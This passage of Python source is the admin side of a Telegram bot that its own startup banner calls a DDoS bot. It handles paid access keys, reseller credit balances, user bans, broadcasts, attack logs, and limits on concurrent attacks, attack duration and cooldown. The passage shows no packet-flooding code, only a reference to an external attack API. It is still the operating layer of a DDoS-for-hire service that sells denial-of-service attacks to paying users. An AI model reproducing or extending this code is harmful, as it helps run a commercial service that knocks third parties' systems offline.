    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "❌ Usage: /removeinkey KEY AMOUNT UNIT")
        return
    
    key = args[1]
    try:
        amount = int(args[2])
        unit = args[3].lower()
    except:
        bot.reply_to(message, "❌ Invalid values!")
        return
    
    success, _ = decrease_key_duration(key, amount, unit)
    if success:
        bot.reply_to(message, f"✅ Key duration decreased by {amount} {unit}(s)")
    else:
        bot.reply_to(message, "❌ Key not found!")

@bot.message_handler(commands=['inallkey'])
def inallkey_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage: /inallkey AMOUNT UNIT")
        return
    
    try:
        amount = int(args[1])
        unit = args[2].lower()
    except:
        bot.reply_to(message, "❌ Invalid values!")
        return
    
    count = increase_all_keys(amount, unit)
    bot.reply_to(message, f"✅ Increased {count} active keys by {amount} {unit}(s)")

@bot.message_handler(commands=['allremoveinkey'])
def allremoveinkey_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage: /allremoveinkey AMOUNT UNIT")
        return
    
    try:
        amount = int(args[1])
        unit = args[2].lower()
    except:
        bot.reply_to(message, "❌ Invalid values!")
        return
    
    count = decrease_all_keys(amount, unit)
    bot.reply_to(message, f"✅ Decreased {count} active keys by {amount} {unit}(s)")

@bot.message_handler(commands=['addreseller'])
def addreseller_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /addreseller USER_ID")
        return
    
    add_reseller(args[1])
    bot.reply_to(message, f"✅ Reseller added: {args[1]}\n\n📢 Notification sent to user.")

@bot.message_handler(commands=['removereseller'])
def removereseller_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /removereseller USER_ID")
        return
    
    if remove_reseller(args[1]):
        bot.reply_to(message, f"✅ Reseller removed: {args[1]}\n\n📢 Notification sent to user.")
    else:
        bot.reply_to(message, "❌ User is not a reseller!")

@bot.message_handler(commands=['addbalance'])
def addbalance_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage: /addbalance USER_ID AMOUNT")
        return
    
    try:
        amount = int(args[2])
        if amount <= 0:
            bot.reply_to(message, "❌ Amount must be positive!")
            return
    except:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    
    new_balance = add_balance(args[1], amount)
    bot.reply_to(message, f"✅ Added {amount} credits to {args[1]}\n💰 New balance: {new_balance}\n\n📢 Notification sent to user.")

@bot.message_handler(commands=['resellers'])
def resellers_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    resellers = load_json(RESELLER_FILE, {})
    if not resellers:
        bot.reply_to(message, "📦 No resellers found.")
        return
    
    msg = "👥 RESELLERS LIST 👥\n\n"
    for uid, info in resellers.items():
        balance = get_balance(uid)
        added_on = info.get("added_on", "Unknown")[:10]
        msg += f"🆔 `{uid}`\n💰 Balance: {balance} credits\n📅 Added: {added_on}\n\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

@bot.message_handler(commands=['allkeys'])
def allkeys_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    msg = "🔑 ALL KEYS DETAILS 🔑\n\n"
    
    msg += "🟢 UNUSED KEYS:\n"
    if keys_data["unused"]:
        for key, info in list(keys_data["unused"].items())[:30]:
            gen_by = info.get("generated_by", "admin")
            duration = info['duration']
            unit = info['unit']
            msg += f"• `{key}`\n  ⏱️ {duration}{unit} | 👤 By: {gen_by}\n\n"
    else:
        msg += "No unused keys\n\n"
    
    msg += "🔴 USED KEYS (ACTIVE USERS):\n"
    if keys_data["used"]:
        for key, info in list(keys_data["used"].items())[:30]:
            user_id = info.get("used_by", "Unknown")
            expiry = info.get('expiry', 'Unknown')[:10]
            duration = info['duration']
            unit = info['unit']
            msg += f"• `{key}`\n  👤 User: {user_id}\n  ⏱️ {duration}{unit} | 📅 Expires: {expiry}\n\n"
    else:
        msg += "No used keys\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

@bot.message_handler(commands=['removekey'])
def removekey_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /removekey KEY")
        return
    
    key = args[1]
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        del keys_data["unused"][key]
        save_json(KEYS_FILE, keys_data)
        bot.reply_to(message, f"✅ Key removed: {key}")
    elif key in keys_data["used"]:
        user_id = keys_data["used"][key].get("used_by")
        
        if user_id:
            users = load_json(USER_FILE, {})
            if str(user_id) in users:
                del users[str(user_id)]
                save_json(USER_FILE, users)
                try:
                    bot.send_message(user_id, f"❌ Your access has been revoked by admin. Your key has been removed.")
                except:
                    pass
        
        del keys_data["used"][key]
        save_json(KEYS_FILE, keys_data)
        bot.reply_to(message, f"✅ Key removed: {key}\n📢 User access revoked and notification sent.")
    else:
        bot.reply_to(message, "❌ Key not found!")

@bot.message_handler(commands=['users'])
def users_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    users = load_json(USER_FILE, {})
    if not users:
        bot.reply_to(message, "📦 No users found.")
        return
    
    msg = "👥 ACTIVE USERS 👥\n\n"
    for uid, info in users.items():
        if info.get("banned", False):
            status = "🚫 BANNED"
        else:
            expiry = datetime.datetime.fromisoformat(info["expiry"])
            if datetime.datetime.now() > expiry:
                status = "⏰ EXPIRED"
            else:
                remaining = expiry - datetime.datetime.now()
                days = remaining.days
                hours = remaining.seconds // 3600
                status = f"✅ ACTIVE ({days}d {hours}h left)"
        
        msg += f"🆔 `{uid}`\n📅 {status}\n🔑 Key: {info['key'][:20]}...\n\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /removeuser USER_ID")
        return
    
    target_user = args[1]
    users = load_json(USER_FILE, {})
    
    if target_user in users:
        key = users[target_user].get("key")
        if key:
            keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
            if key in keys_data["used"]:
                del keys_data["used"][key]
                save_json(KEYS_FILE, keys_data)
        
        del users[target_user]
        save_json(USER_FILE, users)
        
        try:
            bot.send_message(target_user, f"❌ Your account has been removed by admin. Access revoked.")
        except:
            pass
        
        bot.reply_to(message, f"✅ User removed: {target_user}\n📢 Notification sent.")
    else:
        bot.reply_to(message, "❌ User not found!")

@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /ban USER_ID [reason]")
        return
    
    target = args[1]
    reason = " ".join(args[2:]) if len(args) > 2 else "No reason provided"
    
    users = load_json(USER_FILE, {})
    if target in users:
        users[target]["banned"] = True
        users[target]["reason"] = reason
        save_json(USER_FILE, users)
        
        try:
            bot.send_message(target, f"🚫 You Have Been Banned! 🚫\n\n📋 Reason: {reason}\n\n💬 Contact admin for more information.")
        except:
            pass
        
        bot.reply_to(message, f"✅ User {target} banned.\n• Reason: {reason}\n📢 Notification sent.")
    else:
        bot.reply_to(message, "❌ User not found!")

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /unban USER_ID")
        return
    
    users = load_json(USER_FILE, {})
    if args[1] in users:
        users[args[1]]["banned"] = False
        users[args[1]]["reason"] = None
        save_json(USER_FILE, users)
        
        try:
            bot.send_message(args[1], f"✅ You Have Been Unbanned! ✅\n\n🎮 You can now use the bot again.")
        except:
            pass
        
        bot.reply_to(message, f"✅ User {args[1]} unbanned.\n📢 Notification sent.")
    else:
        bot.reply_to(message, "❌ User not found!")

@bot.message_handler(commands=['logs'])
def logs_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f, caption="📋 Attack Logs")
    else:
        bot.reply_to(message, "📦 No logs found.")

@bot.message_handler(commands=['clearlogs'])
def clearlogs_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ ")
        return
    
    with open(LOG_FILE, "w") as f:
        f.write("")
    bot.reply_to(message, "✅ Logs cleared!")

@bot.message_handler(commands=['setlimit'])
def setlimit_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ ")
        return
    
    global MAX_CONCURRENT_ATTACKS, MAX_ATTACK_DURATION, COOLDOWN_SECONDS
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "❌ Usage:  /setlimit MAX_ATTACKS MAX_DURATION COOLDOWN")
        return
    
    try:
        MAX_CONCURRENT_ATTACKS = int(args[1])
        MAX_ATTACK_DURATION = int(args[2])
        COOLDOWN_SECONDS = int(args[3])
        bot.reply_to(message, f"✅ Limits updated!\n\nMax Attacks: {MAX_CONCURRENT_ATTACKS}\nMax Duration: {MAX_ATTACK_DURATION}s\nCooldown: {COOLDOWN_SECONDS}s")
    except:
        bot.reply_to(message, "❌ Invalid values!")

@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Command available admin only!")
        return
    
    broadcast_text = message.text.replace(' /broadcast', '', 1).strip()
    if not broadcast_text:
        bot.reply_to(message, "❌ Usage: /broadcast MESSAGE")
        return
    
    users = load_json(USER_FILE, {})
    if not users:
        bot.reply_to(message, "📦 No users found.")
        return
    
    success = 0
    fail = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 BROADCAST MESSAGE 📢\n\n{broadcast_text}")
            success += 1
        except:
            fail += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\n\n📨 Delivered: {success} users\n❌ Failed: {fail} users")

# ==================== START BOT ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 Dark Devil - Enchaned DDoS Bot Started!")
    print("=" * 50)
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⚔️ Max Attacks: {MAX_CONCURRENT_ATTACKS}")
    print(f"⏱️ Max Duration: {MAX_ATTACK_DURATION}s")
    print(f"🕐 Cooldown: {COOLDOWN_SECONDS}s")
    print(f"🌐 API Mode: {'ENABLED' if API_ENABLED else 'DISABLED'}")
    if API_ENABLED:
        print(f"📍 API URL: {API_URL}")
    print("=" * 50)
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)